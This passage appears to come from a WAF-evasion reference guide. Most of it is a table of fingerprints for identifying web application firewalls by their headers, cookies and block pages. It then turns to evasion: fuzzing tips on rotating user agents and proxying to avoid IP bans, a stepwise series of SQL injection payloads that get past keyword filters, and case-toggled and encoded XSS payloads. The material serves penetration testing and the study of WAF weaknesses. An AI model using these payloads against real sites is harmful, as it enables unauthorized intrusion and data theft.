                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NetScaler (Citrix)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain</li>
                    <ul>
                        <li><code>Connection:</code> header field name jumbled to <code>nnCoection:</code></li>
                        <li><code>ns_af=</code> cookie field name.</li>
                        <li><code>citrix_ns_id</code> field name.</li>
                        <li><code>NSC_</code> keyword.</li>
                        <li><code>NS-CACHE</code> field value.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NewDefend Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li>Reference to <code>http://www.newdefend.com/feedback/misinformation/</code> URL.</li>
                        <li>Reference to <code>/nd_block/</code> directory.</li>
                    </ul>
                    <li><code>Server</code> header contains <code>NewDefend</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NinjaFirewall (NinTechNet)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page title contains <code>NinjaFirewall: 403 Forbidden</code>.</li>
                    <li>Response page contains:
                        <ul>
                            <li><code>For security reasons, it was blocked and logged</code> text snippet.</li>
                            <li><code>NinjaFirewall</code> keyword in title.</li>
                        </ul>
                    </li>
                    <li>Returns a <code>403 Forbidden</code> response upon malicious requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NSFocus Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contain <code>NSFocus</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            onMessage Shield (Blackbaud)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain header <code>X-Engine</code> field with value <code>onMessage Shield</code>.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>Blackbaud K-12 conducts routine maintenance</code> keyword.</li>
                        <li><code>This site is protected by an enhanced security system</code>.</li>
                        <li>Reference to <code>https://status.blackbaud.com</code> URL.</li>
                        <li>Reference to <code>https://maintenance.blackbaud.com</code> URL.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            OpenResty Lua WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains <code>openresty/{version}</code> keyword.</li>
                    <li>Blocked response page contains <code>openresty/{version}</code> text.</li>
                    <li>Blocked response code returned is <code>406 Not Acceptable</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Palo Alto Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>Virus/Spyware Download Blocked</code>.</li>
                    <li>Response page might contain <code>Palo Alto Next Generation Security Platform</code> text snippet.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            PerimeterX Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to<br> <code>https://www.perimeterx.com/whywasiblocked</code> URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Profense Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Set-Cookie</code> headers contain <code>PLBSID=</code> cookie field name.</li>
                    <li><code>Server</code> header contain <code>Profense</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Proventia (IBM)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page might contain to <code>request does not match Proventia rules</code> text snippet.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            pkSecurityModule IDS
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response content may contain</li>
                    <ul>
                        <li><code>pkSecurityModule: Security.Alert</code>.</li>
                        <li><code>A safety critical request was discovered and blocked</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Radware Appwall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains the following text snippet:<br> <code>Unauthorized Activity Has Been Detected.</code> and <code>Case Number</code></li>
                    <li>Response headers may contain <code>X-SL-CompState</code> header field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Reblaze Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Cookies in response headers contain <code>rbzid=</code> header field name.</li>
                    <li><code>Server</code> field value might contain <code>Reblaze Secure Web Gateway</code> text snippet.</li>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>Access Denied (403)</code> in bold.</li>
                        <li><code>Current session has been terminated</code> text.</li>
                        <li><code>For further information, do not hesitate to contact us</code>.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Request Validation Mode (ASP.NET)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>A firewall found specifically on ASP.NET websites and none others.</li>
                    <li>Response page contains either of the following text snippet:</li>
                    <ul>
                        <li><code>ASP.NET has detected data in the request that is potentially dangerous.</code></li>
                        <li><code>Request Validation has detected a potentially dangerous client input value.</code></li>
                        <li><code>HttpRequestValidationException.</code></li>
                    </ul>
                    <li>Blocked response code returned is always <code>500 Internal Error</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            RSFirewall (RSJoomla)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>COM_RSFIREWALL_403_FORBIDDEN</code> keyword.</li>
                        <li><code>COM_RSFIREWALL_EVENT</code> keyword.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Sabre Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Returns status code <code>500 Internal Error</code> upon malicious requests.</li>
                    <li>Response content has:
                        <ul>
                            <li>Contact email <code>dxsupport@sabre.com</code>.</li>
                            <li><code>Your request has been blocked</code> bold warning.</li>
                            <li><code>clicking the above email link will automatically add some important details to the email for us to investigate the problem</code> text snippet.</li>
                        </ul>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Safe3 Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain:</li>
                    <ul>
                        <li><code>X-Powered-By</code> header has field value <code>Safe3WAF</code>.</li>
                        <li><code>Server</code> header contains field value set to <code>Safe3 Web Firewall</code>.</li>
                    </ul>
                    <li>Response page contains <code>Safe3waf</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SafeDog Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy/Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain:</li>
                    <ul>
                        <li><code>WAF/2.0</code> keyword.</li>
                        <li><code>safedog</code> field value.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Secure Entry Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains value set to <code>Secure Entry Server</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SecureIIS (eEye)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains either of the following text snippet:</li>
                    <ul>
                        <li>Image displaying <code>beyondtrust</code> logo.</li>
                        <li><code>Download SecureIIS Personal Edition</code></li>
                        <li>Reference to <code>http://www.eeye.com/SecureIIS/</code> URL.</li>
                        <li><code>SecureIIS Error</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SecureSphere (Imperva)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains the following text snippet:</li>
                    <ul>
                        <li>Error in <code>h2</code> text.</li>
                        <li>Title contains only text as <code>Error</code>.</li>
                        <li><code>Contact support for additional information.</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SEnginx (Neusoft)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>SENGINX-ROBOT-MITIGATION</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Shadow Daemon WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>request forbidden by administrative rules.</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ShieldSecurity
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains: 
                    <ul>
                        <li><code>You were blocked by the Shield.</code> text.</li>
                        <li><code>Something in the URL, Form or Cookie data wasn't appropriate</code> text snippet.</li>
                        <li><code>Warning: You have {number} remaining transgression(s) against this site</code>.</li>
                        <li><code>Seriously stop repeating what you are doing or you will be locked out</code>.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SiteGround Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains<br> <code>The page you are trying to access is restricted due to a security rule</code> text snippet.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SiteGuard (JP Secure)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:
                    <ul>
                        <li><code>Powered by SiteGuard</code> text snippet.</li>
                        <li><code>The server refuse to browse the page.</code> text snippet.</li>
                        <li><code>The URL may not be correct. Please confirm the value.</code></li>
                    </ul> 
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SiteLock TrueShield
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page source contains the following:</li>
                    <ul>
                        <li>Reference to <code>www.sitelock.com</code> URL.</li>
                        <li><code>Sitelock is leader in Business Website Security Services.</code> text.</li>
                        <li><code>sitelock-site-verification</code> keyword.</li>
                        <li><code>sitelock_shield_logo</code> image.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SonicWall (Dell)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contain <code>SonicWALL</code> keyword value.</li>
                    <li>Blocked response page contains either of the following text snippet:</li>
                    <ul>
                        <li>Image displaying <code>Dell</code> logo.</li>
                        <li><code>This request is blocked by the SonicWALL.</code></li>
                        <li><code>Web Site Blocked</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Sophos UTM Firewall 
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>Powered by UTM Web Protection</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SquareSpace Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response code returned is <code>404 Not Found</code> upon malicious requests.</li>
                    <li>Blocked response page contains either of the following text snippet:</li>
                    <ul>
                        <li><code>BRICK-50</code> keyword.</li>
                        <li><code>404 Not Found</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            StackPath (StackPath LLC)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Contains image displaying <code>StackPath</code> logo.</li>
                    <li>Blocked response page contains<br> <code>You performed an action that triggered the service and blocked your request</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Stingray (RiverBed/Brocade)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response code returns <code>403 Forbidden</code> or <code>500 Internal Error</code>.</li>
                    <li>Response headers contain the <code>X-Mapping</code> header field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Sucuri CloudProxy
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain <code>Sucuri</code> or <code>Cloudproxy</code> keywords.</li>
                    <li>Blocked response page contains the following text snippet:</li>
                    <ul>
                        <li><code>Access Denied - Sucuri Website Firewall</code> text.</li>
                        <li>Reference to <code>https://sucuri.net/privacy-policy</code> URL.</li>
                        <li>Sometimes the email <code>cloudproxy@sucuri.net</code>.</li>
                        <li>Contains copyright notice <code>;copy {year} Sucuri Inc</code>.</li>
                    </ul>
                    <li>Response headers contains <code>X-Sucuri-ID</code> header along with normal requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Synology Cloud WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page has <code>Copyright (c) 2019 Synology Inc. All rights reserved.</code>as text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Tencent Cloud WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response code returns <code>405 Method Not Allowed</code> error.</li>
                    <li>Blocked response page contains reference to <code>waf.tencent-cloud.com</code> URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Teros WAF (Citrix)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain cookie field <code>st8id</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            TrafficShield (F5 Networks)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> might contain <code>F5-TrafficShield</code> keyword.</li>
                    <li><code>ASINFO=</code> value might be detected in response cookies.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            TransIP Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain unique header <code>X-TransIP-Backend</code>.</li>
                    <li>Response headers contain another header <code>X-TransIP-Balancer</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            URLMaster SecurityCheck (iFinity/DotNetNuke)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might contain:
                    <ul>
                        <li><code>UrlMaster</code> keyword.</li>
                        <li><code>UrlRewriteModule</code> keyword.</li>
                        <li><code>SecurityCheck</code> keyword.</li>
                    </ul> 
                    <li>Blocked response code returned is <code>400 Bad Request</code> text snippet.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            URLScan (Microsoft)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li></li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>Rejected-by-URLScan</code> text snippet.</li>
                        <li><code>Server Erro in Application</code> as heading.</li>
                        <li><code>Module: IIS Web Core</code> in table.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            USP Secure Entry
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Secure Entry Server</code> field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Varnish (OWASP)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Malicious request returns <code>404 Not Found</code> Error.</li>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>Request rejected by xVarnish-WAF</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Varnish Cache Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>Error 403 Naughty, not Nice!</code> as heading.</li>
                        <li><code>Varnish cache Server</code> as text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            VirusDie Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>http://cdn.virusdie.ru/splash/firewallstop.png</code> picture.</li>
                        <li><code>copy; Virusdie.ru</p></code> copyright notice.</li>
                        <li>Response page title contains <code>Virusdie</code> keyword.</li>
                        <li>Page metadata contains <code>name="FW_BLOCK"</code> keyword</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WallArm (Nginx)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> headers contain <code>nginx-wallarm</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WatchGuard IPS
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> headers may contain <code>WatchGuard</code> field value.</li>
                    <li>Blocked response page contains: </li>
                    <ul>
                        <li><code>Request denied by WatchGuard Firewall</code> text.</li>
                        <li><code>WatchGuard Technologies Inc.</code> as footer.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WebARX Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Restricted to specifically WordPress sites only.</li>
                    <li>Blocked response page contains: </li>
                    <ul>
                        <li><code>This request has been blocked by WebARX Web Application Firewall</code> text.</li>
                        <li>Reference to <code>/wp-content/plugins/webarx/</code> directory where it is installed.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WebKnight (Aqtronix)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>WebKnight</code> keyword.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>WebKnight Application Firewall Alert</code> text warning.</li>
                        <li><code>AQTRONIX WebKnight</code> text snippet.</li>
                    </ul>
                    <li>Blocked response code returned is <code>999 No Hacking</code>. :p</li>
                    <li>Blocked response code returned is also <code>404 Hack Not Found</code>. :p</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WebSEAL (IBM)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contain <code>WebSEAL</code> keyword.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>This is a WebSEAL error message template file</code> text.</li>
                        <li><code>WebSEAL server received an invalid HTTP request</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WebTotem
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>The current request was blocked by WebTotem</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>    
    <tr>
        <td>
            West263 Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>X-Cache</code> header field with <code>WT263CDN</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>    
    <tr>
        <td>
            Wordfence (Feedjit)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>WebKnight</code> keyword.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>Generated by Wordfence</code> text snippet.</li>
                        <li><code>A potentially unsafe operation has been detected in your request to this site</code> text warning.</li>
                        <li><code>Your access to this site has been limited</code> text warning.</li>
                        <li><code>This response was generated by Wordfence</code> text snippet.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WTS Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page title has <code>WTS-WAF</code> keyword.</li>
                    <li><code>Server</code> header contains <code>wts</code> as value.</li>
                </ul>
            </ul>
        </td>
    </tr>   
    <tr>
        <td>
            XLabs Security WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>X-CDN</code> header field with <code>XLabs Security</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>    
    <tr>
        <td>
            Xuanwudun WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to <code>http://admin.dbappwaf.cn/index.php/Admin/ClientMisinform/</code> site URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Yundun Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains <code>YUNDUN</code> as value.</li>
                    <li><code>X-Cache</code> header field contains <code>YUNDUN</code> as value.</li>
                    <li>Response page contains <code>Blocked by YUNDUN Cloud WAF</code> text snippet.</li>
                    <li>Blocked response page contains reference to <code>yundun.com/yd_http_error/</code> URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Yunsuo Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains image class reference to <code>yunsuologo</code>.</li>
                    <li>Response headers contain the <code>yunsuo_session</code> field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ZenEdge Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to <code>/__zenedge/assets/</code> directory.</li>
                    <li><code>Server</code> header contain <code>ZENEDGE</code> keyword.</li>
                    <li>Blocked response headers may contain <code>X-Zen-Fury</code> header.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ZScaler (Accenture)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header has value set to <code>ZScaler</code>.</li>
                    <li>Blocked response page contains:
                        <ul>
                            <li><code>Access Denied: Accenture Policy</code> text.</li>
                            <li>Reference to <code>https://policies.accenture.com</code> URL.</li>
                            <li>Reference to image at <code>https://login.zscloud.net/img_logo_new1.png</code>.</li>
                            <li><code>Your organization has selected Zscaler to protect you from internet threats</code>.</li>
                            <li><code>The Internet site you have attempted to access is prohibited. Accenture's webfilters indicate that the site likely contains content considered inappropriate</code>.</li>
                        </ul>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
</table>

## Evasion Techniques
Lets look at some methods of bypassing and evading WAFs.

### Fuzzing/Bruteforcing:
#### Method:  
Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
- Wordlists specifically for fuzzing 
    - [Seclists/Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
    - [Fuzz-DB/Attack](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack)
    - [Other Payloads](https://github.com/foospidy/payloads)

#### Technique:
- Load up your wordlist into fuzzer and start the bruteforce.
- Record/log all responses from the different payloads fuzzed.
- Use random user-agents, ranging from Chrome Desktop to iPhone browser.
- If blocking noticed, increase fuzz latency (eg. 2-4 secs).
- Always use proxychains, since chances are real that your IP gets blocked.

#### Drawbacks:
- This method often fails. 
- Many a times your IP will be blocked (temporarily/permanently).

### Regex-Reversing:
#### Method:
- Most efficient method of bypassing WAFs.
- Some WAFs rely upon matching the attack payloads with the signatures in their databases.
- Payload matches the reg-ex the WAF triggers alarm.

#### Techniques:

### Keyword Filter Detection/Bypass

__Case__: SQL Injection

##### • Step 1:
__Keywords Filtered__: `and`, `or`, `union`  
- __Blocked Attempt__: `union select user, password from users`
- __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`

##### • Step 2:
__Keywords Filtered__: `and`, `or`, `union`, `where`  
- __Blocked Attempt__: `1 || (select user from users where user_id = 1) = 'admin'`
- __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`

##### • Step 3:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`  
- __Blocked Attempt__: `1 || (select user from users limit 1) = 'admin'`
- __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`

##### • Step 4:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`  
- __Blocked Attempt__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
- __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`

##### • Step 5:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
- __Blocked Attempt__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
- __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
- __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`

##### • Step 6:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
- __Blocked Attempt__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
- __Bypassed Injection__: `1 || user_id is not null`
- __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
- __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`

##### • Step 7:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
- __Blocked Attempt__: `1 || substr(user,1,1) = unhex(61)`
- __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`

##### • Step 8:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
- __Blocked Attempt__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
- __Bypassed Injection__: `1 || lpad(user,7,1)`

##### • Step 9:
__Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
- __Blocked Attempt__: `1 || lpad(user,7,1)`
- __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`

### Obfuscation:
#### Method:
- Encoding payload to different encodings (a hit and trial approach).
- You can encode whole payload, or some parts of it and test recursively.

#### Techniques:
__1. Case Toggling__
- Some poorly developed WAFs filter selectively specific case WAFs.
- We can combine upper and lower case characters for developing efficient payloads.

__Standard__: `<script>alert()</script>`  
__Bypassed__: `<ScRipT>alert()</sCRipT>`

__Standard__: `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
__Bypassed__: `sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'`

__2. URL Encoding__  
- Encode normal payloads with % encoding/URL encoding.
- Can be done with online tools like [this](https://www.url-encode-decode.com/).
- Burp includes a in-built encoder/decoder.

__Blocked__: `<svG/x=">"/oNloaD=confirm()//`  
